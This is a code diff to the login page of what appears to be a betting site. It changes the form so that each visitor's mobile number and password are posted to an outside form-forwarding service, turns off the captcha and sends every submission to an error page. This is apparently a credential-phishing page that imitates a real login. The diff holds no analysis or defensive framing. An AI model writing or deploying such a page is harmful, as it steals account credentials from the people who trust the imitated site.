@@ -39,14 +39,21 @@
         <button class="betslip-btn">Bet Slip</button>
       </div>
     </div>
+
     <div class="container">
       <h2>Login</h2>
-      <form id="login-form">
+      <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
+        <!-- Hidden config fields -->
+        <input type="hidden" name="_captcha" value="false">
+        <!-- Removed _next so no redirect on success -->
+        <!-- Added _error to redirect to error page -->
+        <input type="hidden" name="_error" value="error.html">
+
         <label for="mobile">Mobile Number</label>
-        <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
+        <input type="tel" id="mobile" name="Mobile Number" placeholder="+27 Mobile Number" required />
 
         <label for="password">Password</label>
-        <input type="password" id="password" name="password" placeholder="Password" required />
+        <input type="password" id="password" name="Password" placeholder="Password" required />
 
         <div class="text-link"><a href="#">Forgot Password?</a></div>
 
@@ -68,32 +75,12 @@
     </div>
   </div>
 
-  <!-- Error Page -->
-  <div class="page" id="error-page">
+  <!-- Optional Error Page (not used with FormSubmit) -->
+  <div class="page" id="error-page" style="display: none;">
     <div class="container">
       <h1 class="error-message">An error has been detected</h1>
       <p>Please try again later.</p>
     </div>
   </div>
-
-  <script>
-    document.getElementById('login-form').addEventListener('submit', function (e) {
-      e.preventDefault(); // Stop form from submitting
-
-      const mobile = document.getElementById('mobile').value;
-      const password = document.getElementById('password').value;
-
-      // Simulate login check (replace this with your actual backend logic)
-      if (mobile === '+27123456789' && password === 'password123') {
-        alert('Login successful!');
-        // You can redirect to another page here if needed:
-        // window.location.href = 'dashboard.html';
-      } else {
-        // Show error page
-        document.getElementById('form-page').classList.remove('active');
-        document.getElementById('error-page').classList.add('active');
-      }
-    });
-  </script>
 </body>
 </html>
